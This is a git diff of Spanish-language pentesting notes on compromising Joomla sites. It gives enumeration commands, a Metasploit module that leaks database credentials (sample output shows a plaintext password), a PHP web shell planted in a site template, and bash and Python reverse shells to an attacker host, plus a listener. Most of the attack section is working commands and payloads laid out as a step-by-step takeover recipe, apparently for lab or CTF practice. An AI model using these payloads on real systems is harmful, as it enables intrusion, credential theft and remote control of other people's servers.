@@ -26,48 +26,84 @@ Esta herramienta además de enumerar un servidor Joomla, nos crea un reporte de 
 **/administrator** Es la ruta del panel de autenticacion de admin
 
 ```bash 
-❯ perl joomscan.pl -u http://IP/             # Tool para enumerar Joomla
-
-❯ https://github.com/joomla/joomla-cms       # Enumerar Joomla 
+❯ sudo apt install joomscan   # Instalación en Kali 
 ```
 
-## Archivos y rutas típicas por consola
+```bash 
+❯ joomscan -u http://IP/                # Enumerar Joomla (No importa si joomla esta dentro de un dir), obtener versión
+❯ cmseek -u http://IP/administrator/    # Enumerar el CMS (Si importa si esta dentro de un dir)
+```
 
-```python 
-/var/www/html/         # Ruta donde se encuentra
+## Joomla versión 4.0.0 a 4.2.7 - Obtener credenciales 
+```bash 
+❯ msfconsole -q    # Ingresar a metasploit
+	❯ search auxiliary/scanner/http/joomla_api_improper_access_checks 
+	❯ options 
+	❯ set RHOST IP    (No importa si joomla esta en un dir /administrator/index.php. Solo colocar la IP)
+	❯ run 
 
-/configuration.php     # Archivo principal con credenciales de la base de datos
-/etc/mysql/my.cnf      # Configuración de MySQL. Puede revelar contraseñas o accesos alternos
 
-/plugins               # Plugins (autenticación, contenido, etc.). Algunos desactualizados pueden ser explotables
-/templates             # Temas. Algunos permiten subir archivos o editar código PHP directamente
+# Resultado:
+
+                       IMPORTANTE
+                           ↓
+ ID   Super User  Name  Username  Email            Send Email  Register Date        Last Visit Date  Group Names
+ --   ----------  ----  --------  -----            ----------  -------------        ---------------  -----------
+ 769  *           Oda   Miyamoto  oda@local.local  1           2026-03-06 00:00:00                   Super Users
+
+[+] Config JSON saved to /root/.msf4/loot/20260924123831_default_10.1.80.211_joomla.config_466015.bin
+[+] Joomla Config
+=============
+
+ Setting        Value
+ -------        -----
+ db encryption  0
+ db host        localhost
+ db name        Dbjoomla
+ db password    Pa847word987@Joomla456   ← IMPORTANTE 
+ db prefix      iemj4_
+ db user        joomla425
+ dbtype         mysqli
+
+
+NOTA:
+	- Esas credenciales sirven en el panel de admin e ingresas como 'super user' o en la DB de MYSQL  
 ```
 
 ## Obtener una Shell en Joomla
+```bash 
+1. Para obtener una shell en Joomla, si contamos con acceso administrativo, podemos modificar un template desde 'System → Site Templates' y agregar código PHP para ejecutar comandos. Debemos identificar la ruta donde está instalado Joomla y el template, ya que podremos acceder al archivo modificado mediante una petición como '?cmd=whoami', permitiendo comprobar la ejecución de comandos y posteriormente obtener una reverse shell.
+```
 
 ```bash 
-1. Para obtener una shell en Joomla se puede lograr de la siguiente manera, editando un 'template' del panel de admin y escribir codigo 'PHP' para ejecutar comandos, debemos de saber la ruta en donde se encuentra instalado el template, ya que ahi podremos ejecutar comandos '?cmd=whoami'
-
-
 Opcion 1. Editar cualquier template 
 
-1. Seleccionar un template y darle en 'New File'. Despues, colocar un nombre, agregar la extension de 'PHP', dar en 'Create' y colocar el siguiente codigo:
+Paso 1:
+# Seleccionar un template y hacer clic en 'New File'. Asignarle el nombre 'pwned', seleccionar la extensión PHP, hacer clic en Create y, finalmente, agregar el código correspondiente. Después de colocar el contenido en PHP guardarlo. 
+
 	<?php 
 		echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
-		
+	?>
 
-o de la siguiente manera para obtener la ReverShell directa:
+# O colocar una ReverShell directa:
 
 	<?php
-	   system("bash -c 'bash -i >& /dev/tcp/10.10.14.13/443 0>&1'")
+	   system("bash -c 'bash -i >& /dev/tcp/IP_kali/443 0>&1'")
+	?>
 
 
-2. En la siguiente URL se puede acceder al archivo: 
+Paso 2:
+# En la siguiente URL se puede acceder al archivo creado:
+	http://IP/templates/<Template_Name>/pwned.php?cmd=whoami              # Ejecutar un comando
 
-❯ http://IP/templates/protostar/pwned.php?cmd=whoami       # Ejecutar un comando
-	# URL-encodeamos la revershell y la colocamos en la url (bash -c 'bash -i >& /dev/tcp/IP/443 0>&1')
-❯ http://IP/templates/protostar/pwned.php                  # Llamar al archivo para obtener la ReverShell 
+Paso 3:
+# URL-encodear la revershell 
+	http://IP/templates/<Template_Name>/pwned.php?cmd=which python3       # Verificar si esta instalado python3
+	
+	http://IP/templates/<Template_Name>/pwned.php?cmd=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket();s.connect((%22IP_Kali%22,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(%5B%22/bin/bash%22%5D)%27    # Ejecutar la revershell 
+```
 
-Notas:
-	1. Terminar el comando de PHP '?>'
+```bash 
+Paso 4:
+❯ penelope -p 443    # Recibir la revershell en Kali 
 ```
